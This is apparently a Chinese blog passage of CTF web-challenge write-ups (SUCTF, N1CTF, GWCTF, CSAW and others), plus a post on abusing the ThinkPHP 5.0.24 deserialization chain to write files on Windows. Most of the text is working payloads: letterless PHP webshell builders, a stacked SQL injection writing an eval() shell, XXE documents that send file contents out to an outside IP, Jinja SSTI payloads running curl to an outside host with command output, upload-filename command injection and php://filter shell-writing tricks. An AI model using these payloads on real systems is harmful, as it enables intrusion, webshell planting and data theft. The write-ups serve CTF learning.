经过gzip压缩之后仍有可能出现被过滤的字符，因此可以通过添加一些额外的数据 1action&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;174.1.244.41&#x2F;4.gz&amp;filename&#x3D;g.phar.gz 1action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess 访问 最后绕过open_basedir和disable_function buu的环境有点迷，POST传参的一句话报404，最后使用GET传参成功 1chdir('..');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/')); 预期解是爆破目录 [D3CTF 2019]Showhub源码 定位到漏洞点 Models/Model.php sprintf()格式化字符串漏洞。一句话概括：如果%后面出现一个\\,那么php会把\\当作一个格式化字符的类型而吃掉, 最后%\\（或%1$\\）被替换为空。 这里admin密码hash值无法反推。可以利⽤ON DUPLICATE KEY UPDATE ,当insert已经存在的记录时，执⾏update用下面的当用户名, 密码随便, 注册 123admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08%1$&#39;#&#x3D;&gt;INSERT INTO &#96;$this-&gt;tbname&#96;(&#96;a&#96;,&#96;b&#96;) VALUE(&#39;admin&#39;,&#39;password&#39;) ON DUPLICATE KEY UPDATE password&#x3D;&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#39;#&#39;,&#39;sss&#39;) buu的题目环境没成功， 这时可以从服务器返回的Server头中发现，反代是ATS7.1.2 那么应该很敏感的想到通过HTTP走私 来绕过反代。 https://mengsec.com/2019/10/10/http-request-smugging/ 可以利用CL-TE的方法进行走私攻击 LFI2019源码 跟进get() 有个奇怪的要求，即经过path_sanitizer()处理后的filename和原来不同，并且读取的内容也不同。 最后有一次将/和\\替换为空的操作，这里可以用来尝试构造出不同的文件名，但是在文件名尾试了两种都不行，无法读到文件内容。 这里的环境是windows。 对于Windows的文件读取，有一个小Trick：使用FindFirstFile这个API的时候，其会把&quot;解释为.。意即：shell&quot;php === shell.php 对于本题可以直接设置文件名为&quot;/test， 1234$read_file &#x3D; &quot;.&#x2F;files&#x2F;.&#x2F;test&quot;;$read_file_with_hardened_filter &#x3D; &quot;.&#x2F;files&#x2F;.test&quot;;file_get_contents($read_file) &#x3D; &#39;实际文件内容&#39;;file_get_contents($read_file_with_hardened_filter) &#x3D; false &#x2F;&#x2F;文件不存在 put()方法中对内容的过滤 参考p牛的无字母shell 构造一个readfile(&#39;flag.php&#39;); 构造脚本 1234567891011121314151617181920212223242526272829303132a = \"readfile\"b = \"flag.php\"pos = 2ans = '&lt;?=$_=[];$_=\"$_\";$_=$_[(\"!\"==\"!\")+(\"!\"==\"!\")+(\"!\"==\"!\")];' # 得到afor i in a: if i &gt;= 'a' and i &lt;= 'z': # res = '$__=$_;' res = '$__=$_;' res += ('$__++;') * (ord(i) - ord('a')) pos += 1 # print(i + '=&gt;' + res) ans += res ans += '$___.=$__;' else: ans += '$___.=\"' + i + '\";'print(ans)ans = ''for i in b: if i &gt;= 'a' and i &lt;= 'z': # res = '$__=$_;' res = '$____=$_;' res += ('$____++;') * (ord(i) - ord('a')) pos += 1 # print(i + '=&gt;' + res) ans += res ans += '$_____.=$____;' else: ans += '$_____.=\"' + i + '\";'ans += '$___($_____);?&gt;'print(ans) 得到 1&lt;?=$_=[];$_=\"$_\";$_=$_[(\"!\"==\"!\")+(\"!\"==\"!\")+(\"!\"==\"!\")];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$___.=$__;$__=$_;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$____=$_;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$_____.=\".\";$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$___($_____);?&gt; [SUCTF 2018]annonymous源码 create_function()这个函数的漏洞，他create之后会自动生成一个函数名为%00lambda_%d %d代表是进程中的第几个匿名函数，爆破出$MY即可 1234import requestswhile True: r&#x3D;requests.get(&#39;http:&#x2F;&#x2F;6c2d621c-b6b5-484d-a4fe-48959d98450f.node3.buuoj.cn&#x2F;?func_name&#x3D;%00lambda_1&#39;) print(r.text) [SUCTF 2018]GetShell 从第六位开始检测字符，bp跑一下，只能用$()[]_=;~ 考点是无字母shell，p牛提供了三种思路，+和^也被过滤，还可以考虑取反 1234&lt;?php$a = 'phpinfo';$b = urlencode(~$a);(~urldecode($b))(); 这里由于从第六位开始判断，需要使用短标签&lt;?= 1&lt;?= (~(�������))(); eval()和assert()失败，直接使用system() 12345678&lt;?php$a = 'system';$b = urlencode(~$a);$c = 'ls /';$d = urlencode(~$c);echo $b.\"\\n\";echo $d; 结果最后读到的是SUCTF{fake_flag_web_b} 另一种方法 fuzz代码 1234567891011121314&lt;?phpheader('Content-Type: text/html; charset=utf-8');$str = '当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”';for($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++)&#123; $st = mb_substr($str, $i,1, 'utf-8'); $a = ~($st); $b = $a[1]; #取汉字的第一位 if($b==$_GET['a']) #$_GET['a']想要得到的字符 &#123; echo $st;exit; &#125; &#125;?&gt; 1234567891011echo ~北[$____];&#x2F;&#x2F;secho ~内[$____];&#x2F;&#x2F;yecho ~北[$____];&#x2F;&#x2F;secho ~苏[$____];&#x2F;&#x2F;techo ~的[$____];&#x2F;&#x2F;eecho ~咩[$____];&#x2F;&#x2F;mecho ~课[$____];&#x2F;&#x2F;Pecho ~尬[$____];&#x2F;&#x2F;Oecho ~笔[$____];&#x2F;&#x2F;Secho ~端[$____];&#x2F;&#x2F;Techo ~瞎[$____];&#x2F;&#x2F;a 文件编码改成ISO-8859-15，写入payload保存 1&lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~北[$____];$___.=~内[$____];$___.=~北[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]); [SUCTF 2018]MultiSQL注册登录 构造?id=2-1确认存在数字型sql注入，但是根据一些payload的回显猜测存在一些替换 and可以用^代替，但是select也无法使用，猜了几个字段没成功，只能尝试堆叠注入 ?id=1;select 1;没有出现500，存在堆叠注入 一开始测试时间延迟没反应有点迷 写shell成功 12345print(&quot;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot;.encode(&#39;hex&#39;))&#x3D;&gt;?id&#x3D;1;set @a &#x3D; 0x73656c65637420273c3f706870206576616c28245f504f53545b5f5d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c312e706870273b;prepare smtm_test from @a;execute smtm_test; load_file()读取文件 123456789function waf($str)&#123; $black_str = \"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i\"; $str = preg_replace($black_str, \"@@\",$str); return addslashes($str);&#125; ##############04/12 [SUCTF 2018]Homework 参考：https://www.jianshu.com/p/825d08f530c5 注册登录，发现有一段自定义calc类的源码，点击calc 1show.php?module&#x3D;calc&amp;args[]&#x3D;2&amp;args[]&#x3D;a&amp;args[]&#x3D;2 根据url，猜测传入的module为类名，args[]为参数 之前提到过，如果能实例化任何类，可以利用一些原生类 可获取目录：DirectoryIterator XXE：SimpleXMLElement 创建空白文件：SQLite3 其中危害较大的是XXE，看下SimpleXMLElement的官方文档 1final public SimpleXMLElement::__construct ( string $data [, int $options &#x3D; 0 [, bool $data_is_url &#x3D; FALSE [, string $ns &#x3D; &quot;&quot; [, bool $is_prefix &#x3D; FALSE ]]]] ) 法一、 第一个参数是要解析的数据，第二个参数是一些选项，这里可以传2，第三个参数设置true是允许url格式 1?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;http:&#x2F;&#x2F;174.1.248.102&#x2F;obj.xml&amp;args[]&#x3D;2&amp;args[]&#x3D;true obj.xml 1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM \"http://174.1.248.102/test.xml\"&gt;%int;%all;%send;]&gt; test.xml 12&lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"&gt;&lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://174.1.248.102:1234/?%payl;'&gt;\"&gt; 但是vps没有收到 而且感觉payload的第三个参数由于get传参得到的是字符串的true 法二、 直接get传xml数据 1?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;%3C%3Fxml%20version%3D%221.0%22%2B%3F%3E%0A%3C%21DOCTYPE%20r%20%5B%0A%3C%21ELEMENT%20r%20ANY%20%3E%0A%3C%21ENTITY%20%25%20sp%20SYSTEM%22http%3A%2F%2F174.1.248.102%2Ftest.xml%22%3E%0A%25sp%3B%0A%25param1%3B%0A%5D%3E%0A%3Cr%3E%26exfil%3B%3C%2Fr%3E&amp;args[]&#x3D;2 args[0] 12345678&lt;?xml version=\"1.0\"+?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM\"http://174.1.248.102/test.xml\"&gt;%sp;%param1;]&gt;&lt;r&gt;&amp;exfil;&lt;/r&gt; test.xml 12&lt;!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;&lt;!ENTITY % param1 \"&lt;!ENTITY exfil SYSTEM 'http://174.1.248.102:1234/?%data;'&gt;\"&gt; 还是没回显，迷 #################4/22 [CISCN2019 华东南赛区]Web4观察url 1http:&#x2F;&#x2F;204dea1c-9cd5-4b09-a804-60330cd1abad.node3.buuoj.cn&#x2F;read?url&#x3D;https:&#x2F;&#x2F;baidu.com 本地文件包含，file:///etc/passwd，提示hack，可能是python框架，尝试之前遇到过的trick 1local_file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 读取/app/app.py 总所周知，在知道secret的情况下，flask的session是可以伪造的。 而这里seed是一个固定的值，即uuid.getnode()，该函数读取Mac地址并转换为整数，读一下Mac地址 102:42:ae:00:71:db 本地计算 12345import randomrandom.seed(0x0242ae0071db)print(str(random.random()*233))# 108.741627655 123456[root@glotozz]~/flask-session-cookie-manager# python flask_session_cookie_manager2.py decode -c eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Xp_Bnw.P0_aiNv2EhCkrwMkiZJAR3SNhG0&#123;\"username\":&#123;\" b\":\"d3d3LWRhdGE=\"&#125;&#125;[root@glotozz]~/flask-session-cookie-manager# python flask_session_cookie_manager2.py decode -c eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Xp_Bnw.P0_aiNv2EhCkrwMkiZJAR3SNhG0 -s 108.741627655&#123;u'username': 'www-data'&#125;[root@glotozz]~/flask-session-cookie-manager# python flask_session_cookie_manager2.py encode -t \"&#123;u'username': 'fuck'&#125;\" -s 108.741627655eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Xp_G0Q.o18gCvJAyo3MsLYZBx2UcOUxHuw 替换cookie中的session访问/flag [GWCTF 2019]你的名字1&#123;&#123; 被过滤，可以使用 1&#123;% if %&#125;&#123;% endif %&#125; 黑名单 12345678910blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval', 'if', 'for', ' subprocess', 'file', 'open', 'popen', 'builtins', 'compile', 'execfile', 'from_pyfile', 'local', 'self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']for no in blacklist: while True: if no in s: s = s.replace(no, '') else: breakreturn s 按照顺序对黑名单进行替换 payload，很容易想到利用双写绕过 1&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__[&#39;linecache&#39;].oconfigs.system(&#39;curl http:&#x2F;&#x2F;174.0.119.71&#x2F;?a&#x3D;&#96;ls &#x2F;|base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125; 1&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__[&#39;linecache&#39;].oconfigs.system(&#39;curl http:&#x2F;&#x2F;174.0.119.71&#x2F;?a&#x3D;&#96;cat &#x2F;flag_1s_Hera|base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125; [CSAWQual 2019]Web_Unagi提示上传一个xml，尝试xxe，/user.php 存在回显，直接带出 12345678910111213&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM \"file:///flag\" &gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;intro&gt;&amp;xxe;&lt;/intro&gt; &lt;/user&gt;&lt;/users&gt; 提示WAF，XXE编码转换为UTF-16绕过 1iconv -f utf8 -t utf16 simple.xml&gt;1.xml [N1CTF 2018]eating_cms观察url 1http:&#x2F;&#x2F;8d4b1741-6dfd-4df8-a2a4-63b2fce7ad04.node3.buuoj.cn&#x2F;user.php?page&#x3D;guest# 可能存在文件包含，伪协议读取 123456789&lt;?phprequire_once \"function.php\";if(isset($_SESSION['login'] ))&#123; Header(\"Location: user.php?page=info\");&#125;else&#123; include \"templates/index.html\";&#125;?&gt; 读取function.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130&lt;?phpsession_start();require_once \"config.php\";function Hacker()&#123; Header(\"Location: hacker.php\"); die();&#125;function filter_directory()&#123; $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"]; $uri = parse_url($_SERVER[\"REQUEST_URI\"]); //可以在url中增加多个//来绕过 parse_str($uri['query'], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function filter_directory_guest()&#123; $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"]; $uri = parse_url($_SERVER[\"REQUEST_URI\"]); parse_str($uri['query'], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function Filter($string)&#123; global $mysqli; $blacklist = \"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\"; $whitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+&gt;&lt;\"; for ($i = 0; $i &lt; strlen($string); $i++) &#123; if (strpos(\"$whitelist\", $string[$i]) === false) &#123; Hacker(); &#125; &#125; if (preg_match(\"/$blacklist/is\", $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return \"\"; &#125;&#125;function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function login($user, $pass)&#123; $user = Filter($user); $pass = md5($pass); $sql = \"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'\"; echo $sql; $res = sql_query($sql);// var_dump($res);// die(); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION['user'] = $data[username_which_you_do_not_know]; $_SESSION['login'] = 1; $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return;&#125;function updateadmin($level,$user)&#123; $sql = \"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' \"; echo $sql; $res = sql_query($sql);// var_dump($res);// die();// die($res); if ($res == 1) &#123; return true; &#125; else &#123; return false; &#125; return;&#125;function register($user, $pass)&#123; global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = \"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')\"; $res = sql_query($sql); return $mysqli-&gt;insert_id;&#125;function logout()&#123; session_destroy(); Header(\"Location: index.php\");&#125;?&gt; 根据黑名单，读取ffffllllaaaaggg 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(\"you can not visit it directly\");&#125;else &#123; echo \"you can find sth in m4aaannngggeee\";&#125;?&gt; 读取 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(\"you can not visit it directly\");&#125;include \"templates/upload.html\";?&gt; 访问templates/upload.html，读取upllloadddd.php 123456789101112131415161718192021222324252627&lt;?php$allowtype = array(\"gif\",\"png\",\"jpg\");$size = 10000000;$path = \"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\";$filename = $_FILES['file']['name'];if(is_uploaded_file($_FILES['file']['tmp_name']))&#123; if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename))&#123; die(\"error:can not move\"); &#125;&#125;else&#123; die(\"error:not an upload fileï¼\");&#125;$newfile = $path.$filename;echo \"file upload success&lt;br /&gt;\";echo $filename;//命令执行$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");echo \"&lt;img src='data:image/png;base64,\".$picdata.\"'&gt;&lt;/img&gt;\";if($_FILES['file']['error']&gt;0)&#123; unlink($newfile); die(\"Upload file error: \");&#125;$ext = array_pop(explode(\".\",$_FILES['file']['name']));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125;?&gt; 这代码最后才对后缀进行判断，因此控制文件名命令执行即可 使用#注释 123456789;ls &#x2F;;#&#x3D;&gt;没有结果;ls;#&#x3D;&gt;有结果;ls -la ..;#&#x3D;&gt;又结果;cat ..&#x2F;flag_233333;#&#x3D;&gt;没有结果,猜测是无法使用&#x2F;,经过测试发现$_FILES[&#39;file&#39;][&#39;name&#39;]只会取&#x2F;后面的内容,可以使用..跳转;cd ..;cat flag_233333;# [BSidesCF 2019]SVGMagicConvert SVG to PNG with Magic，这里的考点是XXE 1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE note [&lt;!ENTITY file SYSTEM \"file:///proc/self/cwd/flag.txt\" &gt;]&gt;&lt;svg height=\"100\" width=\"1000\"&gt; &lt;text x=\"10\" y=\"20\"&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt; [HITCON 2015]Babyfirst","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"tp5.0.24反序列化链在Windows下写文件的方法","slug":"tp5-0-24反序列化链在Windows下写文件的方法","date":"2020-04-01T01:50:42.000Z","updated":"2020-04-04T08:10:02.936Z","comments":true,"path":"2020/04/01/tp5-0-24反序列化链在Windows下写文件的方法/","link":"","permalink":"https://glotozz.github.io/2020/04/01/tp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%9C%A8Windows%E4%B8%8B%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 前言 demo1 demo2 demo3 参考链接 前言 之前分析tp5.0.24反序列化链最后只能在linux利用rot13编码写入文件成功，因为windows对文件名有限制，而base64因为在文件内容中存在=而无法正常解码写入。 昨天看到一篇在windows下写文件的办法，利用convert.iconv.*过滤器，等价于iconv() demo1123&lt;?php $cc&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;123.txt&#39;; file_put_contents($cc,&#39;&#x3D;&#39;); 结果为+AD0-，而+AD0-能被convert.base64-decode解析而不报错 demo2123&lt;?php $dd&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;1.txt&#39;; file_put_contents($dd,&#39;Z3188&#x3D;&#39;); 结果如下，因此后面可以通过简单的fuzz demo312345&lt;?php $payload&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;xaaPD9waHAgcGhwaW5mbygpOyAgPz4g&#x2F;..&#x2F;a.php&#39;; $filename&#x3D;$payload.&#39;468bc8d30505000a2d7d24702b2cda94.php&#39;; $data&#x3D;&quot;&lt;?php\\n&#x2F;&#x2F;000000000000\\n exit();?&gt;\\n&quot;.serialize($payload.&#39;647c4f96a28a577173d6e398eefcc3fe.php&#39;); file_put_contents($filename, $data); =====================分割线4/2 今天看了p牛推了一篇文章：一次“SSRF–&gt;RCE”的艰难利用 里面提到了tp5.0.24开启短标签情况下（rot13会导致语法错误）时的解决办法。 1php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-4LE.UCS-4BE&#x2F;resource&#x3D;abcd 函数会将目标4位一反转,从而绕过短标签。 如果仍然写入为空，很有可能设置了php strict模式， 关键文件的总字符数不能被4整除(除后余2，如果添加2字符，则写入数据不能正常显示为shell)导致写入为空。 可以利用下面的方法2位一反转 1php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;xxxx 举例 123456&lt;?php echo iconv(&#39;UCS-2LE&#39;, &#39;UCS-2BE&#39;, &quot;&lt;?php phpinfo();?&gt;&quot;); $payload&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;?&lt;hp phpipfn(o;)&gt;?&#39;; $filename&#x3D;$payload.&#39;468bc8d30505000a2d7d24702b2cda94.php&#39;; $data&#x3D;&quot;&lt;?php\\n&#x2F;&#x2F;000000000000\\n exit();?&gt;\\n&quot;.serialize($payload.&#39;647c4f96a28a577173d6e398eefcc3fe.php&#39;); file_put_contents($filename, $data); ========================分割线 以及p牛在小密圈评论中提到的利用strip_tags去除= 1php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;shell.php 但是我测试了下发现并不行。。 参考链接 